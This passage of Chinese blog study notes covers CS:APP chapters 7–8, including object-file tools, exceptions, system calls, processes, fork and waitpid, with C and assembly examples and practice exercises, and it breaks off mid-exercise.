&#123;<br>        <span class="hljs-built_in">fputs</span>(error, <span class="hljs-built_in">stderr</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    freep(ptr);<br>    <span class="hljs-keyword">if</span>(print_times == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>, ptr);<br>    print_times = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,World!\n&quot;</span>);<br><span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/7ru92ZNpBLqao6z.png" alt="image-20220517153341247"></p><h2 id="7-14-处理目标文件的工具"><a href="#7-14-处理目标文件的工具" class="headerlink" title="7.14 处理目标文件的工具"></a>7.14 处理目标文件的工具</h2><ul><li>AR：创建静态库，插入、删除、列出和提取成员</li><li>STRINGS：列出一个目标文件中所有可打印的字符串</li><li>NM：列出一个目标文件的符号表定义的符号</li><li>SIZE：列出目标文件中节的名字和大小</li><li>READELF：显示一个目标文件的完整结构，包括ELF头中编码的所有信息。包含SIZE和NM的功能</li><li>OBJDUMP：显示一个目标文件中所有的信息。可以反汇编<code>.text</code>节中的二进制指令</li><li>LDD：列出一个可执行文件再运行时所需的共享库</li></ul><h1 id="第8章-异常处理控制流"><a href="#第8章-异常处理控制流" class="headerlink" title="第8章 异常处理控制流"></a>第8章 异常处理控制流</h1><p>从给处理器上电开始，直到处理器断电，程序计算器中的序列为$a_0,a_1,…,a_{n-1}$，其中每个$a_k$是某个相应的指令$I_k$的地址。每次从$a_k$到$a_{k+1}$的过度成为控制转移。这样的控制转移序列称之为处理器控制流。</p><p>平滑序列：$I_k$和$I_{k+1}$在内存中相邻</p><p>平滑流突变：$I_k$和$I_{k+1}$不相邻，通常是由于跳转、调用和返回指令造成，这种突变是内部程序状态中的变化</p><p>系统状态变化例如：硬件定时器定期产生信号、包到达网络适配器后、程序向磁盘请求数据以及子进程终止需要通知父进程等</p><p>现代系统通过使控制流发生突变来应对这些情况，上述突变被称之为异常控制流（Exceptional Control Flow,ECF）</p><h2 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h2><p>异常就是控制流中的突变，用来相应处理器状态中的某些变化</p><ul><li>状态被编码为不同的位和信号</li><li>状态变化被称之为事件</li><li>事件可能与当前指令的直接相关<ul><li>虚拟内存缺页</li><li>算术溢出</li><li>试图除0</li></ul></li><li>时间也可能与当前指令无关<ul><li>系统定时器产生信号</li><li>I&#x2F;O请求完成</li></ul></li></ul><p>处理器检测到事件发生，就会去异常表的跳转表进行查询并进行间接过程调用，跳转到专门处理此类事件的异常处理程序中进行处理。处理程序完成后，根据异常事件的类型可能会发生以下三种情况之一</p><ul><li>处理程序将控制返回给当前指令$I_{curr}$</li><li>处理程序将控制返回给$I_{next}$，如果没有异常则会执行下一条指令</li><li>处理程序终止被中断的程序</li></ul><h3 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h3><p>处理器设计者分配的异常号</p><ul><li>被零除</li><li>缺页</li><li>内存访问违例</li><li>断点</li><li>算术运算溢出</li></ul><p>操作系统内核（操作系统驻留在内存的部分）</p><ul><li>外部I&#x2F;O设备的信号</li></ul><p>系统启动时，操作系统分配和初始化一张称之为异常表的跳转表，表目k包含异常k的处理程序地址</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20220609234222043.png" alt="image-20220609234222043"></p><p>异常表的起始地址放在异常表基址寄存器中</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20220609234558373.png" alt="image-20220609234558373"></p><p>异常的调用过程与过程调用的不同之处</p><ul><li>过程调用时会将返回地址压入栈中，但是根据异常的类型，返回地址可能是当前指令也可能是下一条指令</li><li>处理器会将额外的处理器状态压入栈中，程序返回时，需要用到这些状态。</li><li>若控制从用户程序转移到内核，所有这些项目都将会被压入内核栈中，而不是压入到用户栈中</li><li>异常处理程序运行在内核模式下，因此具有对系统资源的访问权限</li></ul><h3 id="8-1-2-异常的类别"><a href="#8-1-2-异常的类别" class="headerlink" title="8.1.2 异常的类别"></a>8.1.2 异常的类别</h3><p>异常分为四类：中断、故障、陷阱、终止。</p><ul><li>中断</li></ul><p>中断是异步发生的，来自处理器外部的I&#x2F;O设备的信号的结果。例如网络适配器、磁盘控制器和定时器芯片，这些设备通过向处理器新品上的引脚发信号，并将异常号放到系统总线上，来触发中断，异常号用于标识引起中断的设备。</p><ul><li>陷阱和系统调用</li></ul><p>陷阱是有意而为的异常，陷阱最重要用途是在用户态与内核态之间提供一个接口，被称之为系统调用。</p><p>用户程序需要向内核请求服务，比如读文件（read）、创建新进程（fork）、加载新程序（execve）或终止当前进程（exit）。</p><ul><li>故障</li></ul><p>故障由错误情况引起，它可能能够被修正。当故障发生时，处理器就会将控制转移给故障处理程序。当故障能被修正（例如缺页），则将控制返回给引起故障的指令，重新执行它。否则，处理程序返回到内核中<code>abort</code>例程，<code>abort</code>例程会终止引起故障的应用程序。</p><ul><li>终止</li></ul><p>终止是不可恢复的致命错误造成的结果，通常是一些硬件错误，比如<code>DRAM</code>或<code>SRAM</code>位被损坏时发生的奇偶错误。终止处理程序不会将控制返回给应用程序，而是交给<code>abort</code>例程</p><h3 id="8-1-3-Linux-x2F-x86-64系统中的异常"><a href="#8-1-3-Linux-x2F-x86-64系统中的异常" class="headerlink" title="8.1.3 Linux&#x2F;x86-64系统中的异常"></a>8.1.3 Linux&#x2F;x86-64系统中的异常</h3><p><code>x86-64</code>系统定义了256种不同的异常类型</p><ul><li>0-31的号码由<code>Intel</code>架构师定义</li><li>32-255的号码由操作系统定义</li></ul><p><strong>1.Linux&#x2F;x86-64故障和终止</strong></p><ul><li>除法错误：应用试图除以零，或者当处罚指令的结果对于目标操作数来说太大了，<code>Unix</code>不会对除法错误进行恢复处理，而是直接终止程序。<code>Linux Shell</code>报告位浮点异常</li><li>一般保护故障：引用未定义的虚拟内存区域，写只读区域，<code>Linux Shell</code>报告为段故障</li><li>缺页：缺页异常时会重新执行故障的指令</li><li>机器检查：监测到致命的硬件错误</li></ul><p><strong>2.Linux&#x2F;x86-64 系统调用</strong></p><p>当应用程序想要请求内核服务时使用，例如读写文件或创建进程</p><p><img src="https://s2.loli.net/2022/06/10/xkvZNeIHTQAjUBd.png" alt="image-20220610165218222"></p><p>c语言</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;hello,world\n&quot;</span>,<span class="hljs-number">13</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section .data<br>string:<br>.ascii &quot;hello,world\n&quot;<br>string_end:<br>.equ len,string_end -string<br>.section .text<br>.global main<br>main:<br>movq $1,%rax ;系统调用号<br>movq $1,%rdi ;键盘输入<br>movq $string,%rsi ;存储地址<br>movq $len,%rdx ;长度<br>syscall ;调用write(1,&quot;hello,world\n&quot;,13)<br><br>movq $60,%rax ;调用exit(0)<br>movq $0,%rdi<br>syscall<br></code></pre></td></tr></table></figure><h2 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h2><p>进程：正在执行的程序</p><p>系统种的每个程序都运行在某个进程的上下文种。</p><p>上下文由程序正确运行所需的状态组成的</p><ul><li>程序中的代码与数据</li><li>栈、通用寄存器的内容</li><li>程序计数器（PC）</li><li>环境变量</li><li>打开文件描述符</li></ul><p>执行目标文件的流程</p><ul><li>在<code>shell</code>中输入可执行目标文件的名字</li><li><code>shell</code>创建新的进程，在该进程的上下文中运行该可执行目标文件</li></ul><h3 id="8-2-1-逻辑控制流"><a href="#8-2-1-逻辑控制流" class="headerlink" title="8.2.1 逻辑控制流"></a>8.2.1 逻辑控制流</h3><p><code>PC</code>值得序列称之为逻辑控制流</p><h3 id="8-2-2-并发流"><a href="#8-2-2-并发流" class="headerlink" title="8.2.2 并发流"></a>8.2.2 并发流</h3><p>一个逻辑流的执行在时间上与另一个流重叠，称之为并发流</p><p>两个逻辑流并发的运行在不同的处理器核或者计算机上，这为并行流。</p><p><strong>练习题8.1</strong></p><p>考虑三个具有下述起始和结束事件的进程</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20220610171839679.png" alt="image-20220610171839679"></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck">  <span class="hljs-comment">0     1     2   3   4    5</span><br>  <br><span class="hljs-comment">A</span> <span class="hljs-literal">--</span>          <span class="hljs-literal">--</span><br><br><span class="hljs-comment">B</span>       <span class="hljs-literal">--</span>            <span class="hljs-literal">--</span><br><br><span class="hljs-comment">C</span>                 <span class="hljs-literal">--</span>       <span class="hljs-literal">--</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>进程对</th><th>并发的？</th></tr></thead><tbody><tr><td>AB</td><td>并发的</td></tr><tr><td>AC</td><td>不是并发的</td></tr><tr><td>BC</td><td>并发的</td></tr></tbody></table><h3 id="8-2-3-私有地址空间"><a href="#8-2-3-私有地址空间" class="headerlink" title="8.2.3 私有地址空间"></a>8.2.3 私有地址空间</h3><p>进程为每个程序提供它的私有地址空间</p><p><code>Linux</code>进程的地址空间的组织结构</p><p><img src="https://s2.loli.net/2022/06/10/WdjY1VbOuPQIUzK.png" alt="image-20220610172531499"></p><h3 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h3><p>今存起通常使用某个控制寄存器中的一个<strong>模式位</strong>区分用户态与内核态，该寄存器描述了进程当前享有的特权。</p><p>当设置了模式位时，进程运行在内核模式中</p><p>没有设置模式位时，进程运行子用户模式中</p><p>进程通过中断、故障或者陷入系统调用这样的异常从用户态转化为内核态。</p><p><code>/proc</code>文件系统，允许用户模式进程访问内核数据结构的内容</p><ul><li><code>/proc/cpuinfo</code>：CPU类型</li><li><code>/proc/&lt;process-id&gt;/maps</code>：某个特殊的进程使用的内存段</li><li><code>/sys</code>：输出系统总线和设备的额外的底层信息</li></ul><h3 id="8-25-上下文切换"><a href="#8-25-上下文切换" class="headerlink" title="8.25 上下文切换"></a>8.25 上下文切换</h3><p>操作系统内核使用上下文切换的异常控制流实现多任务</p><p>内核选择启用哪个进程的决策称之为调度，由调度器处理</p><p>内核调度过程</p><ul><li>内核选择新进程抢占当前进程</li><li>上下文切换<ul><li>保存当前进程的上下文</li><li>恢复某个先前被抢占的进程被保存的上下文</li><li>将控制传递给这个新恢复的进程</li></ul></li></ul><p><img src="https://s2.loli.net/2022/06/10/cBSUmI9sZd1NLwA.png" alt="image-20220610174537704"></p><h2 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">unix_error</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: %s\n&quot;</span>,msg,strerror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h2><h3 id="8-4-1-获取进程ID"><a href="#8-4-1-获取进程ID" class="headerlink" title="8.4.1 获取进程ID"></a>8.4.1 获取进程ID</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-comment">/* pid_t = int */</span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getpid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回进程的PID</span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">getppid</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回父进程的PID</span><br></code></pre></td></tr></table></figure><h3 id="8-4-2-创建和终止进程"><a href="#8-4-2-创建和终止进程" class="headerlink" title="8.4.2 创建和终止进程"></a>8.4.2 创建和终止进程</h3><p>进程的三种状态</p><ul><li>运行：进程要么在<code>CPU</code>上运行，要么在等待被执行且最终会被内核调度</li><li>停止：进程的执行被挂起，且不会被调度。当收到<code>SIGSTOP</code>、<code>SIGTSTP</code>、<code>SIGTTIN</code>或<code>SIGTTOU</code>信号时，进程就停止，知道接收到<code>SIGCONT</code>信号</li><li>终止：进程永远地停止了，停止地原因有<ul><li>收到信号，该信号默认行为为终止进程</li><li>从主程序返回</li><li>调用<code>exit</code>函数</li></ul></li></ul><p><code>exit</code>函数以<code>status</code>退出状态来终止进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">exit</span><span class="hljs-params">(<span class="hljs-type">int</span> status)</span><br></code></pre></td></tr></table></figure><p>父进程通过<code>fork</code>函数创建新的运行的子进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">子进程返回0，父进程返回子进程的PID，出错为-1</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>新创建的子进程几乎与父进程相同。子进程与父进程具有相同的用户级虚拟空间地址，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，因此子进程可以读写父进程中打开的任何文件。父进程与子进程的区别在于它们具有不同的<code>PID</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unix_error</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: %s\n&quot;</span>,msg,strerror(errno));<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-comment">//fork函数有两个返回值</span><br>    <span class="hljs-comment">//父进程返回子进程的PID</span><br>    <span class="hljs-comment">//子进程返回0</span><br><span class="hljs-keyword">if</span>((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br><span class="hljs-keyword">return</span> pid;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">pid_t</span> pid;<br><span class="hljs-type">int</span> x = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;main\n&quot;</span>);<br>pid = Fork();<br><span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child : x=%d\n&quot;</span>,++x);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PID:%d\n&quot;</span>,pid);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent: x=%d\n&quot;</span>,--x);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PID:%d\n&quot;</span>,pid);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>fork</code>函数特点</p><ul><li>调用一次，返回两次。一次返回到父进程，一次返回到子进程。</li><li>并发执行。父进程与子进程是独立并发的进程并且内核能够以任意方式交替执行它们逻辑控制流中的指令。</li><li>两者相同但是具有独立的地址空间。</li><li>共享文件。父进程与子进程都将输出打印在屏幕上，原因上子进程继承了父进程所有的打开文件。当父进程调用<code>fork</code>时,<code>stdout</code>文件时打开的，并指向屏幕。子进程继承了该文件，因此也会向屏幕输出。</li></ul><p><code>gdb</code>调试<code>fork()</code>函数</p><ul><li>调试父进程：<code>set follow-fork-mode parent</code></li><li>调试子进程：<code>set follow-fork-mode child</code></li></ul><p><strong>练习题8.2 考虑下面的程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(Fork() == <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1: x=%d\n&quot;</span>,++x);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2: x=%d\n&quot;</span>,--x);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>A.子进程的输出是<code>p1: x = 2</code>，<code>p2: x=1</code></li><li>B.父进程的输出是<code>p2：x=0</code></li></ul><h3 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h3><p>进程因为某种原因终止时，内核并不是立即把它从系统中清除。进程被标志为已终止状态，直到它被父进程回收。</p><p>当父进程回收已终止的子进程的时候，内核就会将子进程的退出状态传递给父进程，并且抛弃已终止进程，此时该进程就不存在系统中。</p><p>若已终止进程未被回收则称之为僵尸进程。</p><p><code>init</code>进程是所有进程的父进程，负责回收孤儿进程（即父进程终止，但其子进程还存在，存在的子进程被称之为孤儿进程）。</p><p><code>init</code>进程的<code>PID</code>为1，不会终止。是在系统启动的时候由内核创建的。</p><p>僵尸进程仍然会消耗系统的内存资源。</p><p><code>waitpid</code>函数用于等到它的子进程终止或者停止</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">waitpid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid,<span class="hljs-type">int</span> *statusp, <span class="hljs-type">int</span> options)</span>;<br><span class="hljs-comment">//返回：成功返回子进程PID，否则返回0，其他错误返回-1</span><br></code></pre></td></tr></table></figure><p>默认情况下（<code>options=0</code>)，<code>waitpid</code>挂起调用进程的指向，直到它的集合中的一个子进程终止。</p><p><strong>1.判定等待集合的成员</strong></p><p>等待集合的成员由参数<code>pid</code>确定</p><ul><li><code>pid</code>&gt;0，只等待进程<code>ID</code>等于<code>pid</code>的子进程</li><li><code>pid</code> &#x3D; -1，等待任何一个子进程退出</li><li><code>pid</code> &#x3D; 0，等待同一个进程组中的任何自己才能</li><li><code>pid</code> &lt; -1，等待一个指定进程组中的任何子进程，这个进程组的<code>ID</code>等于<code>pid</code>的绝对值</li></ul><p><strong>2.修改默认行为</strong></p><p><code>options</code>可以设置为<code>WNOHANG</code>、<code>WUNTRACED</code>和<code>WCONTINUED</code>或者这几种的组合</p><ul><li><code>WNOHANG</code>：如果等待集合中的任何子进程都还没有终止，那么就立即返回(返回值为0)。</li></ul><p>例子（参考<a href="https://blog.csdn.net/tycoon1988/article/details/40976807">Linux    waitpid用WNOHANG</a>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">pid_t</span> pc,pr;<br><br>pc = fork();<br><span class="hljs-keyword">if</span>(pc &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork error\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pc == <span class="hljs-number">0</span>)<br>&#123;<br>sleep(<span class="hljs-number">10</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">do</span>&#123;<br>pr = waitpid(pc,<span class="hljs-literal">NULL</span>,WNOHANG);<br><span class="hljs-keyword">if</span>( pr == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No child exit\n&quot;</span>);<br>sleep(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">while</span>(pr == <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> ( pr == pc)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;successfully get child %d\n&quot;</span>,pr);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wait child error\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/06/11/MiaQ6TXko7m1ySc.png" alt="image-20220611005605666"></p><ul><li><code>WUNTRACED</code>：挂起调用进程的指向，直到等待集合中的一个进程变成已终止或者被停止。返回的<code>PID</code>为已终止或被停止子进程的<code>PID</code>。默认的行为是只返回已终止的子进程。</li><li><code>WCONTINUED</code>：挂起调用进程的执行，直到等待集合中一个正在运行的进程终止或等待集合中一个被停止的进程搜到<code>SIGCONT</code>信号重新开始执行。</li></ul><p><strong>3.检查已回收子进程的退出状态</strong></p><p>若<code>statusp</code>参数是飞控的，那么<code>waitpid</code>就会在<code>status</code>中放上关于导致返回的子进程的状态信息，<code>status</code>是<code>statusp</code>指向的值。<code>wait.h</code>头文件定义了解释<code>status</code>参数的几个宏</p><ul><li><code>WIFEXITED</code>：如果子进程通过调用<code>exit</code>或者一个返回正常终止，就返回真</li><li><code>WEXITSTATUS</code>：返回一个正常终止的子进程的退出状态。只有当<code>WIFEXITED()</code>返回真时，才会定义这个状态。</li><li><code>WIFSIGNALED</code>：如果子进程时因为一个未捕获的信号终止的，那么就返回真</li><li><code>WTERMSIG</code>：返回导致子进程终止的信号编号。只有在<code>WIFSIGNALED()</code>返回为真时，才定义这个状态。</li><li><code>WIFSTOPPED</code>：如果引起返回的子进程当前是停止的，那么就返回真</li><li><code>WSTOPSIG</code>：返回引起子进程停止的信号和编号。只有在<code>WIFSTOPPED()</code>返回为真时，才定义这个状态。</li><li><code>WIFCONTINUED</code>：如果子进程收到<code>SIGCONT</code>信号重新启动，则返回真。</li></ul><p><strong>4.错误条件</strong></p><p>如果调用进程没有子进程，那么<code>waitpid</code>返回<code>-1</code>，并且设置<code>errno</code>为<code>ECHILD</code></p><p>如果<code>waitpid</code>函数被一个信号中断，那么它返回<code>-1</code>，并设置<code>errno</code>为<code>EINTR</code></p><p>使用<code>man</code> + 函数名可以查询需要导入的头文件</p><p><strong>练习题8.3</strong></p><p>列出下面程序所有可能的输出序列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(Fork() == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>   